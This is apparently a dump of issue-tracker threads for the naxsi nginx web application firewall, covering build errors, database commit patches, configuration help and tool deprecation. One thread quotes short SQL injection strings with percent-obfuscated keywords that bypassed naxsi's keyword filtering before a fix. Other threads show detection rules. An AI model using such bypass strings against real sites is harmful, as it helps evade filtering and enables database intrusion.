python26\n. From ad...@yqed.com on July 24, 2012 09:56:23\nThat's one dependency, what about the other 12 missing from EPEL and needed by Naxsi UI? Anyways, I wrote myself all deps in order to get a functional UI: http://www.axivo/go/naxsi\n. From ori...@gmail.com on August 01, 2012 10:49:01\nHello,\nI think you resolved the issue ?\n. From ad...@yqed.com on August 01, 2012 10:51:44\nI did, by creating the python26 RPM's in CentOS 5. :) http://www.axivo.com/go/naxsi\n. From ori...@gmail.com on August 17, 2012 01:36:11\nStatus: Verified\n. From ori...@gmail.com on June 17, 2012 05:12:44\nfixed in svn, to be released with 0.47\nStatus: Fixed\n. From robert.m...@fxitech.com on July 25, 2012 03:37:03\nHi,\nI tried compile it with nginx 1.2.2 but I've got the same error and I just realize that in download section 0.47 package is not the same as in svn. Inside this zip is still 0.46-1  \nCheers\n. From sephirot...@gmail.com on June 20, 2012 02:08:50\nHi,\nCould you provide your nginx configuration ? Especially your DeniedUrl location.\nIt's normal behavior for nx_intercept to exit after using the -a switch (it just adds the signature to monitor to the database). For now, the signature is only stocked in the database and nothing is displayed on the web interface, I'll try to add that to the web interface soon.\nnx_intercept doesn't populate /tmp/naxsi_rules.tmp anymore (we should probably remove this part from the wiki). Now, it will store all the exceptions in a database (naxsi_sig if you use the default settings), and you will be able to view the whitelist using nx_extract.\n. From prizem...@gmail.com on June 20, 2012 03:33:14\nHello!\nThank you for your quick answer I have attached both the nginx config and the /sites-enabled/default file.\nSo nx_intercept should store the exceptions in my mysql database or somewhere else?\nThanks again!\nAttachment: nginx.conf default.txt\n. From prizem...@gmail.com on June 20, 2012 07:00:09\nwhen I start nx_intercept -c naxsi-ui-learning.conf -a ip:I - it stops and i see that the error log contains something like this: \" [error] 10481#0: *10 connect() failed (111: Connection refused) while connecting to upstream | upstream: \"http://127.0.0.1:8080/ RequestDenied \"\nHowever when I exclude the - a it produces log like this but still no data to the mysql db:\nNAXSI_FMT: ip=85.67.16.131&server=domain.com&uri=/bblabla/&total_processed=8&total_blocked=1&zone0=ARGS&id0=1000&var_name0=a&zone1=ARGS ....\nHope I could provide more info about my issue.\nThank you!\n. From da...@heidt.biz on July 16, 2012 05:52:58\nwhen using the 0.47 code base on Ubuntu 12.04 the db populates after the first hit\n. From ori...@gmail.com on August 01, 2012 10:35:51\nCan we consider the issue as closed, or do you still face the problem ?\n. From ales.bo...@gmail.com on August 23, 2012 05:07:26\nI have had same problem.\nImport command \"python nx_intercept.py -c naxsi-ui-learning.conf -l /var/log/nginx/error.log\"\nI tried on Debian, versions of nginx-naxsi-ui 1.2.1-2~bpo60+1 and 1.2.3-1~dotdeb.0.\nImport finished successfully, but MySQL haven't any data. \nDuring import, db was filled, after done was empty. Autoincrement in collums matches number of NAXSI_FMT's entries in nginx error log. According MySQl query log, import runs ok. If I rerun query from log, insert was successful.\nAny help will be appreciated.\n. From ori...@gmail.com on August 28, 2012 10:55:27\nHello, \nCan you please provide your logfile ?\nI don't see what can happen here.\nPlease as well give a try for 0.49rc1 if you still face the problem.\nThanks\n. From artiom.l...@gmail.com on August 30, 2012 04:45:37\nI guess python script is not opening auto commit connection to mysql, as a result you need to do commit yourself.\nAttached diff that adds COMMIT command after inserting rows into mysql. This will work on other databases as well.\nAttachment: naxsi-mysql-commit.diff\n. From ori...@gmail.com on August 30, 2012 05:06:07\nHello,\nAs far as I know, MySQL has auto-commit enabled by default, and we didn't explicitly ask for non auto-commit connection, so we shouldn't have to use commit statement.\nPlus, I just did some test and I cannot reproduce your issue.\nCould you please provide some more details about your configuration (debug, python, mysql, nginx etc.) and/or a reproducible test set ?\nAnyway, thanks for the patch, but I'm a bit reluctant to apply it, I'd like to evaluate the possible implications of this first.\nBest regards,\n. From ori...@gmail.com on October 11, 2012 04:10:51\nStatus: Fixed\n. From ori...@gmail.com on June 27, 2012 02:58:35\nthanks ! fixed\n0.47 is to be released soon anyway !\nStatus: Done\n. From ori...@gmail.com on June 27, 2012 07:47:02\nThanks for the suggestion :)\nOwner: ori...@gmail.com\n. From ori...@gmail.com on June 27, 2012 11:08:00\nAfter a bit of reflection, this is actually not possible, as naxsi will drop (redirect the request) as soon as it reaches limit score, so score will be XSS=8 or SQL=8 etc. 99% of the time.\nStatus: Invalid\n. From sephirot...@gmail.com on July 05, 2012 10:42:42\nHi, \nWhat is the size of your logfile ? \nThe parsing can be very slow because we have to parse every line, but 20 minutes seem to be very long. \nYou can also generate whitelist with nx_intercept and nx_extract (the \"classic\"  way, see the wiki for more information).\n. From ori...@gmail.com on July 16, 2012 08:59:38\nHello,\nNext version (0.48) is making log files imports 60 times faster.\nPlease give a try to SVN to see if fix is ok for you !\nBest regards,\n. From design...@gmail.com on July 17, 2012 12:22:11\npython26 nx_extract.py naxsi-ui.conf\nTraceback (most recent call last):\n  File \"nx_extract.py\", line 14, in \n    from twisted.web.guard import HTTPAuthSessionWrapper, DigestCredentialFactory\n  File \"/usr/lib64/python2.6/site-packages/twisted/web/guard.py\", line 10, in \n    from twisted.web.auth.wrapper import HTTPAuthSessionWrapper\n  File \"/usr/lib64/python2.6/site-packages/twisted/web/_auth/wrapper.py\", line 17, in \n    from twisted.python.components import proxyForInterface\nImportError: cannot import name proxyForInterface\n. _From design...@gmail.com on July 17, 2012 16:31:00\nKAMON GUYS :)\nim getting more help from iptables firewall than your naxsi. banning lamers all the way.\nmonth trying to make it work, and still nothing...\nok. could you please explain why do i see naxsi entries in nginx error log, running exploit script, but nothing shows that naxsi sees this shit... nothing in db, nothing in web interface... does it work at all??????\nzero help from this software..\nhm, do i need these white-rules???\nwhat if i run it in non-learning mode? without any whitelist etc...\nim just going to uninstall this crap at the end of this week if nothing changes...\nand your wiki page just something... for god sake....\n. From ori...@gmail.com on July 18, 2012 02:34:26\nHello,\n\nok. could you please explain why do i see naxsi entries in nginx error log, running >exploit script, but nothing >shows that naxsi sees this shit... nothing in db, >nothing in web interface... does it work at all??????\nSo far, 10 times out if 10, this kind of \"issue\", is related to incorrect software configuration. Posting your configuration might help. And yes, people do use it with success. Other people facing the same issue solved it.\n\nOn another hand, \"running exploit script\" while in learning mode makes no sense. I think you misunderstood the goal of the learning mode.\n\nzero help from this software..\nActually, we asked you a question (see current issue), but you did not reply.\nhm, do i need these white-rules???\nwhat if i run it in non-learning mode? without any whitelist etc...\nAsking this might suggest you do not have a good understanding of how the software works.\nim just going to uninstall this crap at the end of this week if nothing changes...\nThis is an open source project, so people work on it on their free time, I think you should show a bit more respect if you actually expect any help. The way you are acting seems more than inappropriate to me.\nand your wiki page just something... for god sake....\nWe are aware that the documentation is lacking, and we are working on it.\nOn the other hand, this is the good point of open source : If you are not happy with it, you can fix it. If you think the wiki is not precise enough, posting an issue with the things that are missing / incorrect in the documentation might be more helpful than \"it sucks\". Or even better, propose changes, harder than just complaining, but waaaay more efficient.\n. From design...@gmail.com on July 18, 2012 05:43:54\n\nhm, it is all your wiki,\nconfigured like you said.\ni am not creating my own settings... default.\nTHATS WHAT IM TALKING ABOUT - NO STRAIGHT FORWARD MANUALS AVAILABLE!!!!!\nwhat to do to make it work just plug and play????\n. From ori...@gmail.com on July 18, 2012 06:19:52\nThat's the other bright side of open source, I can get rid of people like you without even the slightest remorse.\nWant plug & play ? Give your money to an appliance vendor, this is what you need.\nPS: Regarding how fast you manage to lower my expectations in humanity, I decided not to help you.\n. From ori...@gmail.com on July 18, 2012 06:21:22\nStatus: WontFix\n. From prizem...@gmail.com on July 10, 2012 11:17:52\nHello!\nPlease run this on your server:\napt-get update\napt-get install libpcre3 libpcre3-dev\nIt should solve your problem :)\n. From fabio...@gmail.com on July 11, 2012 02:59:12\nIn Debian 6.0.5.\nI've already installed libpcre3 and libpcre3-dev.\n../naxsi-0.46-1/naxsi_src//naxsi_runtime.c: In function \u2018ngx_http_process_basic_rule_buffer\u2019:\n../naxsi-0.46-1/naxsi_src//naxsi_runtime.c:121: error: \u2018ngx_regex_t\u2019 has no member named \u2018pcre\u2019\nBoth 0.46-1 and 0.47.\nSome suggests?\nThx.\n. From GoofT...@gmail.com on July 11, 2012 06:35:27\nI have FreeBSD 8.2 64 and CentOS 5.8 64\nIn CentOS I've installed pcre and pcre-devel, but it didn't help me.\n. From theozo...@gmail.com on July 14, 2012 13:11:39\nsame issue here :/\n. From sephirot...@gmail.com on July 14, 2012 13:14:25\nWhat version of nginx are you using ?\n. From GoofT...@gmail.com on July 14, 2012 13:14:42\n1.2.2\n. From sephirot...@gmail.com on July 14, 2012 13:47:45\nI've commited a fix. Please try again with the latest svn version and let me know if it works now.\n. From fabio...@gmail.com on July 16, 2012 00:53:18\nNew error for me (Debian 6.0.5, nginx-1.2.2) :-(\nmake[1]: Entering directory /root/a2h/sources/nginx/nginx-1.2.2'\ngcc -c -pipe  -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Wunused-function -Wunused-variable -Wunused-value -Werror -g   -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_runtime.o \\\n        ../naxsi-read-only/tags/0.47/naxsi_src/naxsi_runtime.c\n../naxsi-read-only/tags/0.47/naxsi_src/naxsi_runtime.c: In function \u2018ngx_http_process_basic_rule_buffer\u2019:\n../naxsi-read-only/tags/0.47/naxsi_src/naxsi_runtime.c:165: error: \u2018ngx_regex_t\u2019 has no member named \u2018pcre\u2019\nmake[1]: *** [objs/addon/naxsi_src/naxsi_runtime.o] Error 1\nmake[1]: Leaving directory/root/a2h/sources/nginx/nginx-1.2.2'\nmake: *** [install] Error 2\n. From ori...@gmail.com on July 16, 2012 08:57:57\nplease use SVN instead, as this was fixed in SVN and will be included in next version.\nbest regards,\nOwner: ori...@gmail.com\n. From ori...@gmail.com on August 06, 2012 05:55:59\nStatus: Done\n. From ori...@gmail.com on July 18, 2012 00:42:21\nHello,\nI think it might be an issue with your database content.\nAs I can see you are using SQLite, can you please send us your database so we can try reproduce the bug ?\nThanks,\n. From ori...@gmail.com on August 28, 2012 10:54:20\nStatus: Invalid\n. From ori...@gmail.com on July 16, 2012 08:56:14\nThanks David,\nWe will try to include this in the next release :)\nOwner: sephirot...@gmail.com\n. From ori...@gmail.com on August 17, 2012 07:03:57\nfixed in branches/bui_dev/, will be included in 0.49 !\ncan now be defined into naxsi-ui.conf, via \"interface\" directive, defaults to '' (*) for both nx_intercept and nx_extract\nStatus: Fixed\n. From sephirot...@gmail.com on July 24, 2012 03:12:35\nHi,\nhttp_config is deprecated since 0.44, is no longer present in the releases and has never been packaged.\nThis vulnerability is also not critical, so this issue won't be fixed.\nStatus: WontFix\n. From ori...@gmail.com on August 01, 2012 10:34:42\nHello,\nThis has been fixed in SVN and will be in 0.48.\nPlease give a try at svn's version of nx_extract.\nStatus: Duplicate\nMergedinto: 30\n. From sephirot...@gmail.com on September 13, 2012 18:38:15\nPlease use 0.48 or 0.49rc1, it should be fixed.\nStatus: Fixed\n. From ori...@gmail.com on October 11, 2012 04:10:29\nHi !\nThanks for reporting the issue.\nWe are actually rewritting the whole web interface / interception\nmechanism (for 0.49), and this version will include the fix.\nI'll try to backport it to current svn version as well.\nThanks for the bug report ;)\nps: seems your way to fix it is right\n. From ori...@gmail.com on January 07, 2013 10:02:12\nHello,\nThis was reported in 0.49 as expected.\nStatus: Verified\n. From ori...@gmail.com on October 16, 2012 07:02:44\nHello !\nThank you very much for the report, we will investigate quickly.\nUnfortunately, I was not able to reproduce it with a quick testing session, hope I will have some spare time tonight to play with it ;)\nCould you please try to remove naxsi from configuration and see if it happens again ?\n(As I don't see any reference to naxsi in the stacktrace, I would dare to suspect nginx itself)\nIf you are around, could you join #naxsi on freenode so we can discuss the potential issue ?\nBest regards,\nLabels: -Priority-Medium Priority-Critical\n. From ja.luc...@zhr.pl on October 16, 2012 07:44:53\nWhen I turned off the naxsi (comment out one \"include\" in nginx.conf and sites-enabled/site) the error does not occur.\nI have just checked another configuration: Naxsi on (learning mode), turned off the proxy to the backend application (nginx serving only a few static files), and also the problem does NOT occur (I've generated about 1k queries and see still no error).\nSo the problem seems to be related to naxsi + proxy connections. Maybe I'm wrong, but think that my configuration of reverse-proxy function is correct.. Although it is little complicated.\nI do not use irc and I'm not members of freenode, but tomorrow or the day after tomorrow I'll try to find the time to change that.\nBest regards,\nJack\n. From ori...@gmail.com on October 16, 2012 07:58:26\nThanks for that quick answer, I'll try to make some tries in this direction.\nNice finding by the way, don't know yet who's to blame : naxsi or nginx, maybe both ;)\n. From carlos.l...@gmail.com on October 24, 2012 10:20:15\nI am experiencing the same problem. I am using nginx + naxsi in a reverse proxy configuration.\nThe problem occurs when naxsi's rules are being hit. If I disable naxsi or whitelist all the rules the problem goes away.\n. From ja.luc...@zhr.pl on October 25, 2012 02:12:14\nLooks like I found a workaround.\nThe transfer of three \"proxy_set_header\" directives from global \"server\" section to the \"location /\" caused the errors no longer appear: \nproxy_set_header   X-Real-IP        $remote_addr;\nproxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;\nproxy_set_header   X-Url-Scheme $scheme;\nTested with 5k queries \"blocked\" by naxsi in LearningMode , and is OK. In normal (block) mode still allways work correctly too.\nI have not found a reason for my original configuration would be flawed, but it seems that some of the variables in the header should be modified only for proxy section (section \"location /\" directing to @upstream) and should not be modified for local files. Perhaps it is more correct configuration, but it doesn't explain, why without naxsi it work good, and with naxsi caused \"worker process # exited on signal 11\".\nAny idea to confirm this in a different way than the experimentally? Any sources about correct place for proxy_set_header directives? \nOn the internet ( http://lmgtfy.com/?q=proxy_set_header+nginx+signal+11 ) I saw that on BSD with other modules (not naxsi) people have also had a problem with \"exited on signal 11\" with \"proxy_set_header\" in \"location\", so I'm afraid that I have not found a solution, but only a workaround.\nBelow part of my current configuration.\nBest regards,\nJack\n\n/etc/nginx/sites-enabled/site\nserver {\n (..)\n proxy_set_header   X-Forwarded-Proto https;\n proxy_set_header   Host             $host;\n proxy_redirect     off;\nproxy_set_header   X-Real-IP        $remote_addr;\nproxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;\nproxy_set_header   X-Url-Scheme $scheme;\nlocation / {\n   include /etc/nginx/naxsi_my.rules;\n   proxy_set_header   X-Real-IP        $remote_addr;\n   proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;\n   proxy_set_header   X-Url-Scheme $scheme;\n   try_files $uri @upstream;\n   }\n(..)\n}\n\n. From sephirot...@gmail.com on October 26, 2012 02:17:39\nHello,\nI've just commited a patch that should fix this issue.\nCould you try it and tell us if everything is working fine ?\n. From carlos.l...@gmail.com on October 26, 2012 09:45:30\nIt seems to have solved the problem. I've been testing for several hours now and not a single crash :)\nThank you!\nBest regards,\nCarlos\n. From sephirot...@gmail.com on October 26, 2012 09:48:32\nStatus: Fixed\n. From ori...@gmail.com on January 07, 2013 10:02:53\nCouldn't listen on any:8081: [Errno 98] Address already in use.\nI think it's pretty clear : address is already in use :)\nStatus: Invalid\n. From pablo...@gmail.com on November 12, 2012 08:55:42\nI have the same problem with Mysql (InnoDB) on:\ndebian squeeze\nnx_intercept 0.47\nnginx 1.2.1\nI found a post about python-mysqldb and innodb where it's explained that auto-commit is disabled by default ( http://bmaupin.wordpress.com/2011/03/08/python-and-mysql-autocommit/ ).\nFix by enabling auto-commit, so it fix mysql problem but sqlite too :\n--- nx_intercept.py 2012-06-27 12:28:00.000000000 +0200\n+++ nx_intercept.py 2012-11-12 17:44:22.000000000 +0100\n@@ -46,6 +46,7 @@\n         self.cursor = self.db.cursor()\n         if self.cursor is None:\n             raise ValueError(\"Cannot connect to db.\")\n-   self.db.autocommit(True)\n       parser = signature_parser(self.cursor)\n       parser.sig_to_db(fullstr, sig)\n       self.db.close()\n. From ori...@gmail.com on January 07, 2013 10:01:48\nThanks,\npatch reported in 0.49.\nStatus: Verified\n. From ori...@gmail.com on January 07, 2013 10:01:27\nHello,\nNaxsi already has a few rules like this, but I agree it's somehow too limited.\nIf you have a list of suggestions, it would be great. So far, it's really focus on 'real' anomalies (ie. non parsable data, format breaking RFC).\n. From lazy.dog...@gmail.com on January 07, 2013 11:06:13\nthis would be great, something like\n\"str:empty\" \"mz:$HEADERS_VAR:Host|$HEADERS_VAR:User-Agent\"\nmex\n. From didier.c...@googlemail.com on April 04, 2013 06:52:14\nStatus: New\nLabels: Type-Enhancement Component-Contribs\n. From sephirot...@gmail.com on November 28, 2012 00:18:28\nHi, \nCan you provide your nginx + naxsi configuration ?\n. From dim...@gmail.com on November 28, 2012 03:50:24\nhere ares all my configuration\nAttachment: naxsi.rules naxsi_core.rules nginx.conf default\n. From sephirot...@gmail.com on November 29, 2012 01:16:45\nnx_intercept is listening on port 8082, and you do a proxy pass to port 8080 in your RequestDenied location.\nChange the port to 8082, and it should work.\n. From dim...@gmail.com on November 29, 2012 03:53:31\nOk thank you it works. and how can I perform the learning mode?\n. From sephirot...@gmail.com on November 29, 2012 05:39:22\nYou will find every informations you need in the wiki ( https://code.google.com/p/naxsi/wiki/TableOfContents ).\nStatus: Invalid\n. From dim...@gmail.com on November 29, 2012 05:53:16\ni have already read this but i do not see how to add rules to naxsi?\n. From julien.l...@gmail.com on November 30, 2012 07:51:11\nWe met same problem. \nOur environment : \nubuntu 12.04 LTS by using the following ppa : http://ppa.launchpad.net/nginx/stable/ubuntu precise main\nSo we use : \nnginx version: nginx/1.2.4\nWe noticed a problem by using Mysql 5.5 (ubuntu precise official package) and naxsi scripts. When we ran the scripts, no row was added on mysql database. \nWe modified the following script : \n/usr/share/nginx-naxsi/naxsi-ui/SQLWrapper.py \nby changing method => :\n    def StartInsert(self):\n        if self.dbtype == 'sqlite':\n            self.__conn.execute(\"BEGIN\")\n        if self.dbtype == 'mysql':\n            self.__cursor.execute(\"BEGIN;\")\ndef StopInsert(self):\n    if self.dbtype == 'sqlite':\n        self.__conn.commit()\n    if self.dbtype == 'mysql':\n        self.__cursor.execute(\"COMMIT;\")\nI don't know if it's the best things to do but it works now.\n. From carlos.l...@gmail.com on November 30, 2012 10:33:31\nI botched the issue name... sorry about that. Should be something like \"nx_intercept.py SQLite db location bug\".\n. From ori...@gmail.com on January 07, 2013 10:00:13\nHello,\nSorry for late reply :)\nIt is apparently related to your configuration, your data_path = /some_path/db/ should be either relative or absolute, but apparently it's not correct here.\n. From ori...@gmail.com on January 16, 2013 23:34:17\nStatus: Invalid\n. From ori...@gmail.com on December 18, 2012 02:44:58\nHello,\nI have commited a fix in the SVN.\nCan you please give it a try and confirm it works for you ?\nStatus: Fixed\n. From hel...@gmail.com on January 04, 2013 16:32:29\nlatest trunk release fixed this problem...\n. From ori...@gmail.com on January 07, 2013 10:03:24\nStatus: Verified\n. From hel...@gmail.com on January 06, 2013 14:59:15\nI forgot to add the core rules to the nginx config... maybe a nicer error message would help here...\n. From ori...@gmail.com on January 07, 2013 09:58:56\nStatus: Invalid\n. From sephirot...@gmail.com on January 06, 2013 15:09:18\nIt seems that you have set naxsi_flag_learning in a location. It doesn't work.\nYou have to set it outside a location. For example :\nserver {\nset naxsi_flag_learning 1;\nlocation / {\ndo whatever you want\n}\n}\n. From hel...@gmail.com on January 07, 2013 01:30:23\nno my config looks like this\nserver {\n    listen 80;\n```\nserver_name  _;\ninclude /etc/nginx/proxy_params;\nset $naxsi_flag_learning 1;\nlocation /robots.txt {\n    alias /var/www/stuff/norobots.txt;\n}\nlocation ~ /. {\n    deny all;\n}\nlocation / {\n    proxy_pass        http://localhost:8100;\n    include    /etc/nginx/naxsi.rules;\n}\n```\n}\nBut I have several vhosts (servers), I guess the problem might be that once you use this variable you have to define it in every vhost?\n. From ori...@gmail.com on January 07, 2013 09:57:27\nHello,\nActually, the bug happens only if your error_log are in debug AND you have multiple server blocks, with at least one of them with naxsi enabled, but not all of them initializing your variable. I do not see any workaround yet (except removing debug flag from your error_log).\n. From ori...@gmail.com on January 16, 2013 23:35:40\nStatus: Accepted\nLabels: -Type-Defect -Priority-Medium Type-Enhancement Priority-Low\n. From ori...@gmail.com on March 13, 2013 01:56:33\nStatus: WontFix\n. From ori...@gmail.com on January 07, 2013 09:58:19\nHello,\nThis is not something planned yet.\nBest solution imho is to perform learning per-vhost, as you usually have seperate log files for each server block.\n. From ori...@gmail.com on January 07, 2013 09:58:38\nStatus: WontFix\n. From hel...@gmail.com on January 07, 2013 23:45:29\nOk I understand, but it should be quite easy to implement a group by host / servername in the ger_rules nad top10 naxsi_web interface? Or do you think I should run an own naxsi learning server for each vhost?\n. From lazy.dog...@gmail.com on January 30, 2013 00:39:51\nworkaround to sig against a POST - request, eg you want to detect http://www.exploit-db.com/exploits/24206/ \"str:Submit=Run\" \"mz:$URL:/script|$BODY_VAR:Submit\"\n. From didier.c...@googlemail.com on April 04, 2013 06:57:53\nStatus: New\nLabels: Type-Enhancement Component-Logic\n. From ori...@gmail.com on January 16, 2013 23:33:50\nHello,\nYour \"default\" file (I guess your vhost configuration) shows that you didn't configure naxsi for your / locations.\nIf I'm not wrong, then you won't have exceptions put to db as naxsi is not enabled ;)\nCheck for NAXSI_FMT strings your error.log\nStatus: Invalid\n. From dim...@gmail.com on January 16, 2013 23:46:38\nhow can I configure naxsi for my / location?\n. From dim...@gmail.com on January 16, 2013 23:56:21\nI had already followed this tutorial but i don't know what's wrong on my configuration files.\n. From ori...@gmail.com on April 05, 2013 00:38:27\nHello,\nPlease switch to nx_utils, there is a downloadable release available on googlecode.\nnx_extract/nx_intercept are dead, we are not going to make them evolve.\nPlease let us know how it works for you,\n. From dim...@gmail.com on April 05, 2013 01:12:59\ni tried it. and how can i access to the naxsi web interface?\n. From ori...@gmail.com on April 05, 2013 01:19:03\nHello,\nA manpage is included within the package (if you used install, just man nx_util, if you are using .tgz directly, man ./nx_util.1.gz).\nOption for report generation is like :\nnx_intercept -l  -H report.html\nThis will generate the html report, and store it to the file report.html in the current directory.\nPlease have a look at the manpage, as nx_util offers a lot more things.\n. From ori...@gmail.com on April 06, 2013 06:36:31\nStatus: Invalid\n. From ori...@gmail.com on April 06, 2013 06:38:32\nPlease switch to nx_util.( https://code.google.com/p/naxsi/wiki/NxUtil_man )\nnaxsi-ui is discontinued, as live learning is too expensive.\nnx_util provides the same features (whitelists, reporting generation) without involving a web server.\nStatus: Started\n. From ori...@gmail.com on August 11, 2013 14:12:42\nStatus: Done\n. From ori...@gmail.com on March 13, 2013 01:56:14\nHello,\nIf you do a ps/netstat, do you see the process running and the ports listening ?\nTo me seems like nx_intercept cannot start because of misconfiguration ?\n. From manager...@gmail.com on March 13, 2013 02:04:25\nHi,\nThank you for the reply, I've been looking this morning again at getting it working - but still not luck. \nLooking at netstat it doesn't appear to be listening on port 8080/8081 as per my config.\nI've tried installing from source following the instructions here - https://gist.github.com/purwandi/4690042 but still no luck.\n. From manager...@gmail.com on March 13, 2013 02:08:11\nJust to add on, following the instructions above the tables in the db are created now, after doing:\npython nx_intercept.py -c /etc/nginx/naxsi-ui-learning.conf -l /var/log/nginx/error.log\nNo pid_path in conf file ! Using /tmp/nx_intercept.pid\nNo log_path in conf file ! Using /tmp/\n41 exceptions stored into database.\nbut still not seeing it listing on the defined ports\n. From ori...@gmail.com on April 06, 2013 06:38:06\nPlease switch to nx_util.( https://code.google.com/p/naxsi/wiki/NxUtil_man )\nnaxsi-ui is discontinued, as live learning is too expensive.\nnx_util provides the same features (whitelists, reporting generation) without involving a web server.\nStatus: Started\n. From ori...@gmail.com on May 13, 2013 02:36:43\nStatus: Invalid\n. From ori...@gmail.com on March 13, 2013 01:54:53\nHey mex :)\nI'm not 100% sure I understood you, but you could give a try to post action.\nIt's something that is called upon request completion (and naxsi already uses that in learning mode), like :\nlocation /Denied {\n proxy_pass http://your_server_that_returns_stuff:8080;\n post_action /NxIntercept;\n}\nlocation /NxIntercept {\n proxy_pass http://nx_intercept:8080;\n}\nBut please remind, we are going to kill nx_intercept/live learning !\nIf you have a problem with that (killing live learning), please let me know ;)\n. From lazy.dog...@gmail.com on March 13, 2013 05:28:37\neither this or\nlocation / RequestDenied {\n  proxy_pass http://nx_intercept:8080;\n}\nin in naxsi-ui.conf\nredirect_location = \"/why-you-came-here\"\n. From didier.c...@googlemail.com on April 04, 2013 06:53:52\nStatus: New\nLabels: Type-Other Component-Logic\n. From lazy.dog...@gmail.com on April 10, 2013 03:27:58\ni had a nice talk recently with some owasp - guys who told me that a timing - attack is possible if the waf simply drops the connection, thus allowing an attacker to determine which rules are loaded and which waf might be used. if we pass the intercepted request to a default error-page, handeled by the app, those  timing-attacks are more difficult.\nsee https://www.usenix.org/system/files/conference/woot12/woot12-final2.pdf\nAttachment: woot12-final2.pdf\n. From ori...@gmail.com on March 26, 2013 07:30:56\nHello,\nEven we are not really interested into asp/iis security, a 2-lines patch is coming within minutes ;)\n. From ori...@gmail.com on March 26, 2013 07:57:10\nPatch is commited,\nRegarding the vulnerability, the exploitation window is limited to quote less SQL injections with two field (max) selected.\nThe attack can be used to bypass filtering on SQL keywords (mostly, or only), but naxsi will still match on other characters, so even without the patch, a :\nbla u%nion s%elect foo,bar,baz fr%om bar\nor a\nbla' ...\nwill be still catched (as naxsi matches as well on quotes, commas etc.)\nStatus: Fixed\n. From Saf...@gmail.com on March 26, 2013 19:49:29\nsome keywords such as and with %and could bypass too, %and union s%elect a  from b\n. From Saf...@gmail.com on March 26, 2013 19:52:59\nI appreciate your soon response to fix it.Naxsi is a nice project,hope it will be better.\n. From didier.c...@googlemail.com on April 04, 2013 06:56:05\nStatus: New\nLabels: Type-Defect Component-Scripts\n. From ori...@gmail.com on April 06, 2013 06:54:44\nHello,\nI added support for bz2 files (in trunk)\nHowever, I do think that it's somehow best to rely on file extensions, \nas this something quite predictable, so far extensions .bz2 and .gz are supported, would you see any other to add ?\nStatus: Fixed\n. From merlin8...@gmail.com on April 06, 2013 09:39:48\nHmmm, maybe .xz / .lzma / .7z are candidates ? But I doubt they're commonly used.\n. From didier.c...@googlemail.com on April 04, 2013 06:45:41\nNaxsi is an open source community effort, hence every participant try to help the project with his/her best capabilities. \nSadly documentation looks like not being our core team best capability. In a sense do you prefer a stable and secure software or documentation? ;) \nHowever, we welcome any support: bug report, bug fixes, patches, translations, bug triage, almost everything, so feel free to contribute as you can. \nDocumentation-wize, could you point out the parts that are not clear enought or maybe wrong? \nThanks for your support.\nStatus: New\nLabels: Component-Docs Type-Enhancement\n. From ori...@gmail.com on April 05, 2013 00:35:37\nHello,\nThe nx_util release (0.3) includes a detailed manpage (nx_util.1.gz).\nStatus: Invalid\n. From didier.c...@googlemail.com on April 04, 2013 06:48:56\nHi,\nAFAIK, the Naxsi dev team does not publish on this ppa.\nTherefore this bug report might be sent to the ppa maintainance team: https://launchpad.net/~nginx Cheers,\nStatus: Invalid\n. From ori...@gmail.com on April 06, 2013 06:04:42\nThanks !\nFixed in trunk (trunk/nx_util).\nnaxsi-ui is deprecated, please switch to nx_util !\nStatus: Done\n. From ori...@gmail.com on April 06, 2013 06:35:20\nPlease switch to nx_util.( https://code.google.com/p/naxsi/wiki/NxUtil_man )\nnaxsi-ui is discontinued, as live learning is too expensive.\nnx_util provides the same features (whitelists, reporting generation) without involving a web server.\nStatus: WontFix\n. From ser...@galkin.me on April 04, 2013 05:12:16\nNginx error log entry is following:\n2013/04/04 15:36:11 [error] 29763#0: *32 NAXSI_FMT: ip=192.168.100.23&server=gate2.development&uri=/&total_processed=17&total_blocked=4&zone0=BODY&id0=11&var_name0=, client: 192.168.100.23, server: gate2.development, request: \"POST /?object=Session&action=getSalt HTTP/1.1\", host: \"gate2.development\"\nI haven't found what id0=11 mean.\n. From ori...@gmail.com on April 06, 2013 05:54:21\nHello,\nRules with IDs lower than 1000 are naxsi internal rules.\nYou can find them in your naxsi_core.rules :\n@MainRule \"msg:weird/incorrect request\" id:1;\n@MainRule \"msg:big request, unparsed\" id:2;\n@MainRule \"msg:uncommon hex encoding (%00 etc.)\" id:10;\n@MainRule \"msg:uncommon/empty content-type in POST\" id:11;\n@MainRule \"msg:uncommon/malformed URL\" id:12;\nHere, it it because your POST has apparently no content, which sounds weird to naxsi, triggering an internal rule. You can whitelist it as any other rule.\nStatus: Invalid\n. From ori...@gmail.com on April 26, 2013 00:46:25\nHello,\nThis is a rather strange issue, and might be caused by incorrect/incomplete naxsi lines (even nx_util tries to handle those).\nIn order to understand better what's going on, could you please add the following line in nx_lib/nx_whitelists.py at line 86 (just before the \"if len(r['var_name']) > 0:) :\nprint(r)\nThis will print the exceptions that are extracted from database, and you should look at the last print before the exception.\nThe output should allow you to find back the faulty line as well (you will have ID, url etc.). Once you've spotted it, please send it to us, so we can fix this exception.\nthanks,\n. From ori...@gmail.com on May 13, 2013 02:36:23\nStatus: Invalid\n. From bandnew...@gmail.com on June 13, 2013 01:37:28\nHi,\nI got this error too. And when I add print(r), I got:\n(100, 1001, 'ARGS', 'vulnarg', '//foobar', 1, 1, 100)\nTraceback (most recent call last):\n  File \"/usr/local/python-2.7.5/bin/nx_util.py\", line 117, in \n    base_rules, opti_rules = wl.opti_rules_back()\n  File \"/usr/local/python-2.7.5/lib/python2.7/site-packages/nx_lib/nx_whitelists.py\", line 94, in opti_rules_back\n    if len(r['var_name']) > 0:\nIndexError: No item with that key\nIt looks like the results from sqlite missed something? It ought to be a dict, but It just a array?\n. From nicolas....@gmail.com on June 20, 2013 14:22:35\nHi guy,\nI guess this is which backend is used.\nI have the same error with\n- nx_util 1.0 or 0.3\n- on centos5\n- with python2.6\nI guess the problem is due to sqlite\nWhen nx_util fetch data from the database:\nfor req in opti_select_DESC:\n            res = self.wrapper.execute(req)\n            #res = self.wrapper.getResults()\n            for r in res:\nI can get the first field of a line:\nprint r[0] \nbut I cannot do it via column name:\nprint r['exception_id']\nI don't have tested yet with a mysql backend.\n. From nicolas....@gmail.com on June 20, 2013 14:35:57\nI answer 